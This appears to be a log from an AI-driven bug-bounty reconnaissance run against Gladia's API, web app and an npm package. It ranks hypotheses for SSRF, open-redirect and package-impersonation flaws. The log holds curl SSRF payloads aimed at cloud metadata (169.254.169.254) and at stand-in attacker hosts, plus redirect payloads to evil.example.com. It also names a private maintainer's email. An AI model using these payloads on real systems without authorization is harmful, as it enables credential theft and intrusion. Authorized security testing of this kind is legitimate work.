verify_steps: AUTH_HELPED — with program-provided/authorized trial `x-gladia-key:<KEY>`: (1) POST https://api.gladia.io/v2/pre-recorded -H "x-gladia-key:$KEY" -H "Content-Type: application/json" -d '{"audio_url":"http://<attacker-canary>","punctuation_enhanced":false}'; (2) same -d '{"audio_url":"http://169.254.169.254/latest/meta-data/"}'; (3) same w/ callback_config.url={"url":"http://<attacker-listener>"} to confirm server-originated POST; (4) POST https://api.gladia.io/video/text/video-transcription (multipart video_url=http://169.254.169.254/latest/meta-data/) as second fetch path. Compare reachability signal vs benign control.
impact: Cloud metadata read (169.254.169.254), internal-network SSRF/DNS+timing oracle, callback POST to arbitrary URL enabling blind SSRF + potential credential/exfil path from API origin. Severity High (key-gated but origin-bypassable).
testability: AUTH_HELPED
[HYP] npm `gladia`@0.1.3 impersonation / supply-chain confusion
class: OTHER
asset: npm registry package `gladia` (v0.1.3, dist-tag latest)
confidence: 80
reasoning: Live 23:5x npm registry confirm: description "Official TypeScript SDK for Gladia - State-of-the-art Speech to Text API"; repository git+https://github.com/alexisbouchez/gladia.ts.git (personal account, NOT org gladiaio); maintainer softwarecitadel@gmail.com (personal email); published date maps to 2025-03-28, precedes official @gladiaio/sdk 1.1.0 (2025-09-09). README labels itself "Unofficial" — direct contradiction with registry "Official" description. Typo-squat/typo-confusion target for `npm install gladia`.
evidence_needed: npm registry metadata (obtained live 23:5x); tarball content hash + confirm baseUrl=api.gladia.io only (no malicious endpoint), no postinstall, dependency hygiene.
verify_steps: PASSIVE — npm view gladia@0.1.3 version description repository.url repository.type maintainer.email time; npm dist gladia@0.1.3 (sha256 tarball + npm view gladia@0.1.3 dist.tarball then download+hash, never raw secrets); grep package for baseUrl/postinstall/suspicious require; npm view @gladiaio/sdk description repository.url to contrast official.
impact: Developers installing `gladia` (typo of @gladiaio/sdk, or fooled by "Official" description) pull unofficial code from a personal account → future maintainer-account compromise = supply-chain RCE into consumer builds. Severity Med-High (High if account/repo hijacked).
testability: PASSIVE
[HYP] Post-auth open redirect via redirect_to in signin form action
class: OATH
asset: app.gladia.io /signin?redirect_to=
confidence: 45
reasoning: Live 23:5x — GET /signin?redirect_to=https://evil.example.com returns HTML form action="/signin?redirect_to=https%3A%2F%2Fevil.example.com" (server-side reflection into POST action) for Google OAuth intent; server resets tampered return-to cookie to {"url":"/"} (cookie-tamper vector REJECTED); no host allowlist seen on the reflected redirect_to at the unauthenticated layer. Post-auth honoring/unverified Location requires an authenticated Google SSO session.
evidence_needed: Complete Google OAuth sign-in with ?redirect_to=https://evil.example.com and capture final post-auth 302 Location; test //evil.example.com, bare-host, app.gladia.io.evil.example.com, path-only variants.
verify_steps: AUTH_HELPED — with authorized/verified Google SSO session: (1) GET /signin?redirect_to=https://evil.example.com, complete Google OAuth flow, capture final 302 Location + Set-Cookie; (2) repeat with redirect_to=https://evil.example.com//\\evil.example.com and //evil.example.com (protocol-relative) and https://app.gladia.io.evil.example.com; (3) attempt redirect_to-as-redirect_uri injection to escalate to OAuth state/code theft.
impact: Post-auth phishing redirect to attacker-controlled host; Low-Med normally, High if redirect_uri proven injectable (OAuth code/state theft).
testability: AUTH_HELPED
[FINAL] 1) SSRF via audio_url/video_url/callback_url server-side fetch (api.gladia.io, 80, AUTH_HELPED)
[FINAL] 2) npm gladia@0.1.3 impersonation / supply-chain confusion (npm, 80, PASSIVE)
[FINAL] 3) Post-auth open redirect via redirect_to in signin form action (app.gladia.io, 45, AUTH_HELPED)
[NEXT] HUMAN: api.gladia.io is HIGHEST-priority with the top-ranked SSRF hypothesis gated only by a valid API key. Request a program-provided / authorized trial `x-gladia-key` and execute the 4-step verification (benign-canary baseline vs 169.254.169.254 metadata vs callback_config.url outbound-POST listener vs /video/text/video-transcription multipart path), comparing error_code/status/timing for a reachability signal. This is the single blocking item for the #1 finding. (npm anomaly is already reportable PASSIVE; open-redirect stays AUTH_HELPED pending authorized SSO.)
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: /health returns 200 `{"health":"OK"}` (x-powered-by ABSENT on GET) — undocumented endpoint + preflight-only fingerprint confirmed fresh 23:5x UTC
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: OPTIONS /v2/transcription 204 `x-powered-by: Express` + ACAO `*` + allow `x-gladia-key`, POST 401 no`x-powered-by` — preflight-only fingerprint + creds-bypassable CORS confirmed fresh
[LEARN] ACCEPTED AUTH @ api.gladia.io: POST /v2/transcription (no key) → 401 — key-gated surface confirmed; @gladiaio/key header is the sole auth model
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: /openapi.json (200, 125131B, CORS `*`, expose-headers trace ids) + /v1/models (200 public CORS `*`) fully exposed — surface stable & fresh
[LEARN] ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com → form action reflects URL-encoded value — reflection confirmed fresh 23:5x UTC
[LEARN] ACCEPTED MISCONFIG @ app.gladia.io: /dashboard returns 200 text/html (SPA shell) without auth — client-side enforcement confirmed fresh
[LEARN] ACCEPTED OTHER @ npm: `gladia`@0.1.3 description "Official TypeScript SDK…", repo alexisbouchez/gladia.ts (personal), maintainer softwarecitadel@gmail.com — impersonation anomaly confirmed fresh 23:5x UTC
[LEARN] (no new REJECTED class this cycle; surface re-confirmed byte-identical to 23:08 per 23:48 prior re-probe — drift negative)
[RISK] api.gladia.io: 85 — public OpenAPI (14 paths incl. public /v1/models), CORS `*` + x-gladia-key cross-origin (no cred), Express fingerprint on preflight, audio_url/video_url/callback_url format:uri no scheme allowlist (SSRF surface, client-side guard absent in SDK), ws token in URL query, /health undocumented, NestJS-on-Express single key-gated auth
[RISK] app.gladia.io: 55 — Google OAuth-only (no self-service bypass), /dashboard 200 SPA w/o auth (client-side), redirect_to reflected into form action (AUTH_HELPED post-auth), strict CSP, unsigned base64url return-to (REJECTED as cookie-tamper redirect), no SSRF/callback surface on app
[RISK] sdk: 45 — official @gladiaio/sdk 1.1.0 (npm) + gladiaio-sdk (PyPI) clean (no secrets, no malicious code from prior reposcan); npm `gladia`@0.1.3 impersonation anomaly (personal repo, pre-dates official, "Official" vs "Unofficial" contradiction) sole reportable supply-chain candidate; gladia-quiz-app pins @gladiaio/sdk 0.5.2 on unpkg (maintenance debt, no security impact)
## 2026-08-08 02:52:33 UTC [app] (model laguna)
[PRIO] api.gladia.io: 8.5 — a9/b10/tech8/gate5/cloud8/fresh10 — public OpenAPI(14 paths incl. public /v1/models), CORS `*`+x-gladia-key cross-origin(no cred), Express fingerprint on preflight, audio_url/video_url/callback_url format:uri no scheme allowlist, key-gated(401) but creds-bypassable origin
[PRIO] npm `gladia`@0.1.3: 7.85 — a6/b9/tech6/gate10/cloud1/fresh10 — artifact-level impersonation confirmed (README "Unofficial" vs package.json "Official", personal author/repo, WS raw-key in URL query)
[PRIO] app.gladia.io: 7.55 — a7/b10/tech6/gate8/cloud2/fresh10 — Google OAuth-only, /dashboard 200 SPA no auth(client-enforced), redirect_to reflected into form action, strict CSP, unsigned base64url return-to cookie(server-resets on tamper)
[HYP] Artifact-level package impersonation + WebSocket API-key leakage in npm `gladia`@0.1.3
class: OTHER
asset: npm registry package `gladia` 0.1.3 (tarball sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2)
confidence: 85
reasoning: Independently re-verified 02:50 UTC: package.json description="Official TypeScript SDK for Gladia" contradicts README.md line 3="Unofficial TypeScript SDK"; author=Alexis Bouchez, repository=alexisbouchez/gladia.ts (personal, not gladiaio org), published 2025-03-28 predates official @gladiaio/sdk 1.1.0; src/client.ts:307 appends raw x-gladia-key to wss://.../v2/live?x-gladia-key=<KEY> (key in URL → access-log/proxy-capture leakage); no postinstall/eval, no malicious endpoint override.
evidence_needed: npm view/tarball already gathered; affiliation check vs official Gladia org still needed.
verify_steps: PASSIVE — done: `npm view gladia@0.1.3` (description/repo/maintainer/time) + tarball download → sha256sum + grep README/package.json/client.ts (02:50 UTC).
impact: `npm install gladia` misleads devs into unofficial code (impersonation); live API keys leaked into WS URL query strings (access logs, proxy history, Referer). Severity Med (impersonation) + Med (key hygiene). High if maintainer account compromised.
testability: PASSIVE
[HYP] SSRF via audio_url/video_url/callback_url server-side fetch
class: SSRF
asset: api.gladia.io POST /v2/pre-recorded (audio_url, callback_config.url), /v2/transcription, /v2/upload, /video/text/video-transcription (video_url)
confidence: 80
reasoning: Surface frozen 02:50 UTC — /openapi.json (125131B, CORS `*`, expose-headers trace ids) declares InitTranscriptionRequest.audio_url (format:uri), video_url (plain string, no scheme), CallbackConfigDto.url (format:uri) with NO scheme allowlist/pattern; RAG of gladiaio/sdk (sdk-js client.ts + sdk-python v2/prerecorded/core.py) confirms is_url()/uploadFile() only gates upload-vs-direct — no host/metadata-blocklist/redirect-limit/scheme forwarded to API. /v1/models confirms FR/US egress. POST endpoints 401 no-key but CORS `*` + ACAH `x-gladia-key` w/o credentials lets any origin present an authorized key.
evidence_needed: With valid x-gladia-key: POST /v2/pre-recorded `{"audio_url":"http://<attacker-canary>"}` (benign baseline) vs `{"audio_url":"http://169.254.169.254/latest/meta-data/"}` (metadata); multipart video_url on /video/text/video-transcription; POST callback_config.url=http://attacker-listener; compare error_code/status/duration for reachability signal.
verify_steps: AUTH_HELPED — with program-provided/authorized trial `x-gladia-key:$KEY`: (1) POST https://api.gladia.io/v2/pre-recorded -H "x-gladia-key:$KEY" -H "Content-Type: application/json" -d '{"audio_url":"http://<attacker-canary>","punctuation_enhanced":false}'; (2) same -d '{"audio_url":"http://169.254.169.254/latest/meta-data/"}'; (3) same -d '{"callback_config":{"url":"http://<attacker-listener>"}}'; (4) POST https://api.gladia.io/video/text/video-transcription (multipart video_url=http://169.254.169.254/latest/meta-data/). Compare reachability vs benign control.
impact: Cloud metadata read (169.254.169.254), internal-network SSRF/timing oracle, callback POST to arbitrary URL (blind SSRF + credential/exfil path). Severity High (key-gated but creds-bypassable origin).
testability: AUTH_HELPED
[HYP] Post-auth open redirect / OAuth redirect_uri injection via redirect_to in signin form action
class: OATH
asset: app.gladia.io /signin?redirect_to=
confidence: 55
reasoning: Live 02:50 UTC — GET /signin?redirect_to=https://evil.example.com (200) reflects URL-encoded into form action="/signin?redirect_to=https%3A%2F%2Fevil.example.com"; 02:50 UTC re-probed //evil (action=.../redirect_to=%2F%2Fevil.example.com), app.gladia.io.evil (confusing-subdomain), path-only, bare-host — ALL reflected, NO host allowlist at unauth layer; unsigned base64url return-to cookie {"url":"/"} confirms server-driven redirect concept; cookie-tamper vector REJECTED (server resets to {"url":"/"}) but that's distinct from post-auth redirect_to honoring.
evidence_needed: Final post-auth HTTP 302 Location resolving to external host after completing Google sign-in with redirect_to set; test redirect_to-as-OAuth-redirect_uri injection.
verify_steps: AUTH_HELPED — with authorized/verified Google SSO session: (1) GET /signin?redirect_to=https://evil.example.com, complete Google OAuth flow, capture final 302 Location + Set-Cookie; (2) repeat //evil, bare-host, app.gladia.io.evil variants; (3) attempt redirect_to-as-redirect_uri injection to escalate to OAuth code/state theft.
impact: Post-auth phishing redirect to attacker host; Low-Med normally, High if redirect_uri proven injectable (OAuth code/state theft).
testability: AUTH_HELPED
[PARKED] none — all three hypotheses have confidence ≥ 40, classes not on the REJECTED list (SSRF/OAUTH/OTHER all ACCEPTED-alive), and concrete verify_steps.
[FINAL]
[NEXT] HUMAN: Request an authorized Google SSO session for app.gladia.io to close the #3 open-redirect POC — complete the OAuth sign-in with `?redirect_to=https://evil.example.com` (+ `//evil`, `app.gladia.io.evil` variants) and capture the final post-auth 302 Location + Set-Cookie to confirm the server honors redirect_to to an external host (and test redirect_to-as-redirect_uri injection). Reflection is confirmed unauthenticated (02:50 UTC); the post-auth honoring is the sole unverified gate for this app target.
[LEARN] CONFIRMED OTHER @ npm gladia@0.1.3: artifact-level impersonation independently re-verified 02:50 UTC (tarball sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2; package.json "Official" vs README "Unofficial"; author alexisbouchez/personal repo; src/client.ts:307 raw x-gladia-key appended to wss://.../v2/live? token query)
[LEARN] ACCEPTED OATH @ app.gladia.io: /signin?redirect_to= reflection confirmed alive 02:50 UTC across protocol-relative //evil, bare-host, app.gladia.io.evil confusing-subdomain, path-only — no host allowlist at unauthenticated layer (post-auth honoring still AUTH_HELPED)
[LEARN] REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 6 cycles (23:08→23:48→00:44→02:50 UTC); openapi 125131B/14 paths, /health 15B, /v1/models 530B, x-powered-by Express on OPTIONS-only, CORS `*`+ACAH x-gladia-key — surface frozen, nothing new this cycle
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: preflight-only `x-powered-by: Express` fingerprint differential confirmed fresh 02:50 UTC (OPTIONS /v2/transcription 204 xpb=Express; POST 401 xpb absent) — not isolated to one endpoint
[LEARN] ACCEPTED SSRF @ api.gladia.io: spec/spec+RAG unchanged 02:50 UTC (audio_url/video_url/callback_url format:uri no scheme allowlist, no client-side guard) — SSRF-by-design fetch surface remains live, gated only by key AUTH_HELPED
[RISK] api.gladia.io: 85 — public OpenAPI(14 paths incl. public /v1/models), CORS `*` + x-gladia-key cross-origin(no cred), Express fingerprint on preflight, audio_url/video_url/callback_url format:uri no scheme allowlist(SSRF surface, client-side guard absent in SDK), ws token in URL query, /health undocumented, NestJS-on-Express single key-gated auth, cloud egress FR/US
[RISK] app.gladia.io: 55 — Google OAuth-only(no self-service bypass), /dashboard 200 SPA w/o auth(client-side enforcement), redirect_to reflected into form action(AUTH_HELPED post-auth), strict CSP, unsigned base64url return-to(server-resets on tamper), no SSRF/callback surface on app
[RISK] sdk: 50 — official @gladiaio/sdk@1.1.0(npm)+gladiaio-sdk(PyPI) clean(no secrets/malicious code from reposcan); npm gladia@0.1.3 impersonation+WS-raw-key now independently artifact-verified(confirmed alive); gladia-quiz-app pins @gladiaio/sdk@0.5.2 on unpkg(maintenance debt, no security impact)
